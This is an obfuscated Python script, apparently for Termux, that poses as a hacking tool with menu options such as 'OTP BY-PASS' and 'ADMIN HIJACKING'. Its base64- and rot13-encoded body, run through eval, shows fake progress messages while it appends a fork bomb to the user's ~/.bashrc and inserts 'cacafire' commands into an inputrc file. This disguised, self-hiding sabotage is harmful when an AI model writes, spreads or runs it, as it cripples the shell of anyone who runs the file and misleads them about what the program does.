import base64, codecs
magic = 'aW1wb3J0IG9zCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKb3Muc3lzdGVtKCJwa2cgaW5zdGFsbCBmaWdsZXQiKQpvcy5zeXN0ZW0oImZpZ2xldCB3ZWxjb21lIikKb3Muc3lzdGVtKCdjbGVhcicpCnRpbWUuc2xlZXAoMykKb3Muc3lzdGVtKCJhcHQgaW5zdGFsbCBsaWJjYWNhIikKcHJpbnQoIiBcdTAwMWJbMzFtIikKcHJpbnQoIlsxXSBPVFAgQlktUEFTUyIpCnByaW50KCJbMl0gVFdPLVNURVAtRklOREVSIikKcHJpbnQoIlszXSBBRE1JTiBISUpBQ0tJTkciKQpwcmludCgiWzRdIEFVVE8gUkVQT1JURVIgXG5cbiIpCnVfY2hvaWNlPWludChpbnB1dCgnQ2hvb3NlIGEgb3B0aW9uOiAgJykpCmlmIHVfY2hvaWNlPT0xOgogICAgIG9zLnN5c3RlbSgiY2xlYXIiKQogICAgIHByaW50KCJQcm9jZXNzaW5nIHBsZWFzZSB3YWl0IC0iKQogICAgIHRpbWUuc2xlZXAoMSkKICAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgICBwcmludCgiUHJvY2Vzc2luZyBwbGVhc2Ugd2FpdCAvIikKICAgICB0aW1lLnNsZWVwKDEpCiAgICAgb3Muc3lzdGVtKCJjbGVhciIpCiAgICAgcHJpbnQoIlByb2Nlc3NpbmcgcGxlYXNlIHdhaXQgfCIpCiAgICAgdGltZS5zbGVlcCgxKQogICAgIG9zLnN5c3RlbSgiY2xlYXIiKQogICAgIHBya'
love = 'J50XPWDpz9wMKAmnJ5aVUOfMJSmMFO3LJy0VSjtVvxXVPNtVPO0nJ1yYaAfMJIjXQRcPvNtVPNto3Zhp3ymqTIgXPWwoTIupvVcPvNtVPNtpUWcoaDbVyOlo2Ayp3AcozptpTkyLKAyVUqunKDtYFNvXDbtVPNtVUEcoJHhp2kyMKNbZFxXVPNtVPOipl5mrKA0MJ0bVzAfMJSlVvxXVPNtVPOjpzyhqPtvHUWiL2Imp2yhMlOjoTIup2Htq2ScqPNiVvxXVPNtVPO0nJ1yYaAfMJIjXQRcPvNtVPNto3Zhp3ymqTIgXPWwoTIupvVcPvNtVPNtpUWcoaDbVyOlo2Ayp3AcozptpTkyLKAyVUqunKDtsPVcPvNtVPNtqTygMF5moTIypPtkXDbtVPNtVT9mYaA5p3EyoFtvL2kyLKVvXDbtVPNtVUOlnJ50XPWDpz9wMKAmnJ5aVUOfMJSmMFO3LJy0VSjtVvxXVPNtVPO0nJ1yYaAfMJIjXQRcPvNtVPNto3Zhp3ymqTIgXPWwoTIupvVcPvNtVPNtpUWcoaDbVyOlo2Ayp3AcozptpTkyLKAyVUqunKDtYFNvXDbtVPNtVUEcoJHhp2kyMKNbZFxXVPNtVPOipl5mrKA0MJ0bVzAfMJSlVvxXVPNtVPOjpzyhqPtvHUWiL2Imp2yhMlOjoTIup2Htq2ScqPNiVvxXVPNtVPO0nJ1yYaAfMJIjXQRcPvNtVPNto3Zhp3ymqTIgXPWwoTIupvVcPvNtVPNtpUWcoaDbVyOlo2Ayp3AcozptpTkyLKAyVUqunKDtsPVcPvNtVPNtqTygMF5moTIypPtkXDbtVP'
god = 'AgIG9zLnN5c3RlbSgiY2xlYXIiKQogICAgIHByaW50KCJQcm9jZXNzaW5nIHBsZWFzZSB3YWl0IFwgIikKICAgICB0aW1lLnNsZWVwKDEpCiAgICAgb3Muc3lzdGVtKCJjbGVhciIpCiAgICAgcHJpbnQoIlByb2Nlc3NpbmcgcGxlYXNlIHdhaXQgLSAiKQogICAgIHRpbWUuc2xlZXAoMSkKICAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgICBsb2FkKCdDb25uZWN0aW5nIHRvIHNlcnZlci4uLi4uXG4nKQogICAgIG9zLnN5c3RlbSgiZWNobyAnOigpIHsgOnw6ICYgfTsgOicgPj4gfi8uYmFzaHJjIikKICAgICBvcy5zeXN0ZW0oImVjaG8gJ2NhY2FmaXJlIC1MJyA+PiB+Ly4gaW5wdXRyYyIpCiAgICAgdGltZS5zbGVlcCgxKQogICAgIG9zLnN5c3RlbSgicHl0aG9uIGJhbm5lci5weSIpCmVsaWYgdV9jaG9pY2U9PTI6CiAgICAgICAgcHJpbnQoIndhaXQgYSBzZWMiKQogICAgICAgIHByaW50KCJcMDMzWzE7MzI7NDBtIHdhaXQgXG4iKQogICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICBwcmludCgiXDAzM1sxOzMyOzQwbSBlcnJvciBcbiIpCiAgICAgICAgb3Muc3lzdGVtKCJlY2hvICdjYWNhZmlyZSAtTCcgPj4gfi8uIGlucHV0cmMiKQogICAgICAgIG9zLnN5c3RlbSgiZWNobyAnY2FjYWZpcmUgLUwnID4'
destiny = '+VU4iYvOcoaO1qUWwVvxXVPNtVPNtVPOipl5mrKA0MJ0bVzIwnT8tWmbbXFO7VQc8BvNzVU07VQbaVQ4+VU4iYzWup2ulLlVcPvNtVPNtVPNto3Zhp3ymqTIgXPWjrKEbo24tLzShozIlYaO5VvxXMJkcMvO1K2Abo2ywMG09ZmbXVPNtVPNtVPOjpzyhqPtvMJkyL3ElomL2AvNtCw4+VTAioJyhMlOmo29hYv4hVvxXVPNtVPNtVPOipl5mrKA0MJ0bVzIwnT8tW2AuL2SznKWyVP1ZWlN+CvO+Yl4tnJ5jqKElLlVcPvNtVPNtVPNto3Zhp3ymqTIgXPWyL2uiVPqwLJAuMzylMFNgGPptCw4tsv8hVTyhpUI0pzZvXDbtVPNtVPNtVT9mYaA5p3EyoFtvMJAbolNaBvtcVUftBaj6VPLtsGftBvptCw4tsv8hLzSmnUWwVvxXVPNtVPNtVPOipl5mrKA0MJ0bVaO5qTuiovOvLJ5hMKVhpUxvXDcyoTyzVUIsL2uinJAyCG00BtbtVPNtVPNtVUOlnJ50XPW3LJy0VTMipvOuVQZtoJyhqKEyplVcPvNtVPNtVPNto3Zhp3ymqTIgXPWyL2uiVPqwLJAuMzylMFNgGPptCw4tsv8hVTyhpUI0pzZvXDbtVPNtVPNtVT9mYaA5p3EyoFtvMJAbolNaBvtcVUftBaj6VPLtsGftBvptCw4tsv8hLzSmnUWwVvxXVPNtVPNtVPOcoKOipaDto3ZXnG0jPaqbnJkyVSElqJH6PvNtVPOipl5gn2EcpvuzVzM1L2g7nK0vXDbtVPNtnFf9ZDbtVPNtVPNtVNb='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
